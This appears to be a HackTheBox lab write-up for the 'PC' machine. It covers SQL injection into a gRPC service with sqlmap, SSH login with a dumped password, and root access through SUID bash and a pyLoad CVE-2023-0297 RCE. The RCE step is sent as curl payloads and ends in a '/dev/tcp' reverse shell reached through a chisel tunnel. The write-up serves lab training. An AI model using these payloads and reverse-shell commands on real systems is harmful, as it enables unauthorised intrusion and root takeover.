---
Platform:
  - HackTheBox
Difficulty: Easy
tags:
  - gRPC
Status: Rooted/Finished
Blog Posting: Not Posted
Type: Machine
---
  

Hey guys in this write up we are going to solve break into the machine PC from HackTheBox.

Link to the Machine: [https://app.hackthebox.com/machines/PC](https://app.hackthebox.com/machines/PC)

  

`IP = 10.10.11.214`

  

Lets Start ðŸ™Œ

### Step - 01 :

Connect to the HTB server by using the OpenVpn configuration file thatâ€™s generated by HTB.

[ [Click Here](https://help.hackthebox.com/en/articles/5185687-introduction-to-lab-access) to learn more about how to connect to VPN and access the boxes. ]

### Step - 02 :

After connecting to the VPN service, click on Join Machine to access the machineâ€™s IP.

### Step - 03 :

After joining the machine you could see the IP Address of the target machine.

![[PC/assets/Untitled.png|Untitled.png]]

### Step - 04:

Now run `rustscan` to look out for open ports.

![[PC/assets/Untitled 1.png|Untitled 1.png]]

From the results of `rustscan`, we can see that two ports are open. So, I ran nmap on these ports to enumerate more details.You can also see that the machine is blocking ping probes, so use the `-Pn` flag.

Command: `nmap -A -T4 -p 22,50051 -Pn <IP>`

![[PC/assets/Untitled 2.png|Untitled 2.png]]

If we take a look at port `50051`, it returns some data, which is unrecognised. On further research about port `50051`, found the following: [https://grpc.io/](https://grpc.io/). Port `50051` , is running the gRPC service, a Remote Procedure Call (RPC) framework developed by google.

  

On further looking out for exploits for this service, I found this writeup:

[https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9](https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9)

from which I found the following tool:

https://github.com/fullstorydev/grpcui

After installing the tool, run the following command: `grpcui -plaintext 10.10.11.214:50051`

![[PC/assets/Untitled 3.png|Untitled 3.png]]

And also from the above write-up, I inferred that this service might be vulnerable to `SQL Injection`.

Now visit the `grpcui` Web UI hosted at [`http://127.0.0.1:43021`](http://127.0.0.1:43021) [ Note: The port number might differ in your case ]

![[PC/assets/Untitled 4.png|Untitled 4.png]]

We can see that the gRPC service is a `SimpleApp` with `register`, `login` and `getinfo` features.

I first registered a new user.

username: `something`

password: `something`

![[PC/assets/Untitled 5.png|Untitled 5.png]]

Successfully created a user with the name `something`

Next I tried to login with the created user.

![[PC/assets/Untitled 6.png|Untitled 6.png]]

Successfully logged in!!! We got the `id` and the `token` for the user `something`. Note the id and token.

Now I tried the `getinfo` feature. I used the id and token that we noted in the previous step.

![[PC/assets/Untitled 7.png|Untitled 7.png]]

My Request was successful, but there was no details in the response, instead it was an empty object.

![[PC/assets/Untitled 8.png|Untitled 8.png]]

Now we are able to successfully send request to the `getInfo` feature. The `id` value in the `getinfo` tab might be vulnerable to SQL injection. So I again tried the `getInfo` function, but this time I captured the request with burpsuite and I saved the request as a file.

![[PC/assets/Screencast_from_2023-08-07_14-27-39.webm]]

Now using the saved request file, I used `sqlmap` to check out for SQL Injection using the following command:

```
sqlmap -r request --flush-session --threads 10 --batch -p id --level 3 --risk 3
// Here:
// --flush-session : optional command, Flush session files for current target
// --threads : to mention the number of threads to be utilized
// --batch : Never ask for user input, use the default behavior
// --level : Level of tests to perform (1-5, default 1) 
// --risk : Risk of tests to perform (1-3, default 1)
// -p : to specify the Testable parameter(s)
```

![[PC/assets/Untitled 9.png|Untitled 9.png]]

![[PC/assets/Untitled 10.png|Untitled 10.png]]

From the output of `sqlmap`, we can see that the `id` parameter is vulnerable to SQL Injection and from the output we can see that the database used by the gRPC service is `sqlite`.

Now we can dump the database using the following command:

```
sqlmap -r request --flush-session --threads 10 --batch -p id --level 3 --risk 3 --dump
// Here:
// --flush-session : optional command, Flush session files for current target
// --threads : to mention the number of threads to be utilized
// --batch : Never ask for user input, use the default behavior
// --level : Level of tests to perform (1-5, default 1) 
// --risk : Risk of tests to perform (1-3, default 1)
// -p : to specify the Testable parameter(s)
// --dump : Dump DBMS database table entries
```

![[PC/assets/Untitled 11.png|Untitled 11.png]]

From the results of `sqlmap`, we have found a new credential:

username: `sau`

password: `HereIsYourPassWord1431`

I tried to login via SSH using the above credentials and got in.

![[PC/assets/Untitled 12.png|Untitled 12.png]]

I listed out the current directory and found the user flag.

![[PC/assets/Untitled 13.png|Untitled 13.png]]

And also, in the current directory, found the following tools:

`chisel` - A fast TCP tunnel over HTTP.

`linpeas.sh` - it is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.

---

## Privilege Escalation

I first ran [`linpeas.sh`](http://linpeas.sh) , looking out for privilege escalation vectors.

### **Method 1**

![[PC/assets/Untitled 14.png|Untitled 14.png]]

From the output of `linpeas.sh`, we can see that the `/usr/bin/bash` has a SUID bit set on it.

If you check GTFObins [https://gtfobins.github.io/gtfobins/bash/#suid](https://gtfobins.github.io/gtfobins/bash/#suid) , we can use the command `bash -p` to escalate our privileges as root.  

> [!important]  
> To learn more about SUID, check out: https://thamizhiniyancs.notion.site/SUID-3f467c4031c44d7d926eef3e1bff60fb?pvs=4  

![[PC/assets/Untitled 15.png|Untitled 15.png]]

We have successfully obtained the root flag.

---

### **Method 2**

![[PC/assets/Untitled 16.png|Untitled 16.png]]

From the output of `linpeas.sh`, we can see that a service is running on port `8000` locally on the target machine.

We can use `chisel` to create a proxy/tunnel to access this service on our local machine/attack box.

To do that we have to have the same version of chisel on both attacking and target machine.

First lets check the chisel version available in the target machine.

![[PC/assets/Untitled 17.png|Untitled 17.png]]

The target machine has chisel version 1.8.1.

Download the same version of chisel on your attacking machine.

Now from the attacking machine run the following command to create the chisel sever:

`chisel server -p 9001 --reverse`

![[PC/assets/Untitled 18.png|Untitled 18.png]]

Next on the target machine run the following command to setup the client and also to port forward the internal service:

`chisel client <HTB_tunnel_IP>:9001 R:5000:localhost:8000`

Once you run the above command, if you check the server, you can see that the connection is established.

![[PC/assets/Untitled 19.png|Untitled 19.png]]

Now in the attack machine, go to `localhost:5000` to take a look at the service running on the target machine.

![[PC/assets/Untitled 20.png|Untitled 20.png]]

You can see that, `pyload` is running on the target machine on port `8000` internally.

From another terminal, I logged in via SSH to the target machine as `sau` to check the version of `pyload` running.

![[PC/assets/Untitled 21.png|Untitled 21.png]]

The version of `pyload` running is `0.5.0`. On searching exploits for this version of payload, found the following website: [https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad) , which showcased the RCE vulnerability on this version of `pyload`.

![[PC/assets/Untitled 22.png|Untitled 22.png]]

We have found the exploit. Now we can modify it to our needs and run the exploit.

> [!important]  
> Note: The above exploit can execute only one command at a time. Donâ€™t try to chain a series of commands, it wonâ€™t work. Run the commands one by one.  

First we are going to create a [`reverse.sh`](http://reverse.sh) shell file on the target machine in any directory, in this case we are using the `/tmp` directory. To do this run the following modified exploit:

```
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/rev.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:5000/flash/addcrypted2'

// Commands are URL encoded
```

If we run the above exploit, we can see that an error is thrown.

![[PC/assets/Untitled 23.png]]

But if we open another terminal and login to the target machine via SSH as `sau` and check the `/tmp` directory we can see that a `rev.sh` file is created with root permissions.

![[PC/assets/Untitled 24.png]]

Now we have to provide permissions to all the users to read, write and execute, since the owner of the file is root. To do this use the following exploit:

```
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"chmod%20777%20/tmp/rev.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:5000/flash/addcrypted2'

// Commands are URL encoded
```

After executing the above command, if check the file permissions of the [`rev.sh`](http://rev.sh) file, you can see that all users have all permissions.

![[PC/assets/Untitled 25.png]]

Now we can edit the [`rev.sh`](http://rev.sh) file. Add the following content to the `rev.sh` file to create a reverse shell.

```
#! /bin/bash
bash -i >& /dev/tcp/<HTB_tunnel_IP>/9002 0>&1
```

![[PC/assets/Untitled 26.png]]

Donâ€™t try to execute the reverse shell from the target machine, as you will get the reverse shell only with the privileges of `sau` , as the `rev.sh` file is executed by that user.

Before executing the reverse shell, start a `netcat` listener on the attacking machine.

![[PC/assets/Untitled 27.png]]

Now run the following command to execute the reverse shell as root:

```
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"/tmp/rev.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:5000/flash/addcrypted2'

// Commands are URL encoded
```

![[PC/assets/Untitled 28.png]]

After executing the above command, check the `netcat` listener that you created.

![[PC/assets/Untitled 29.png]]

We have successfully obtained the reverse shell with root privileges.

![[PC/assets/Untitled 30.png]]

And we have successfully obtained the root flag.

  

Thank Youâ€¦â€¦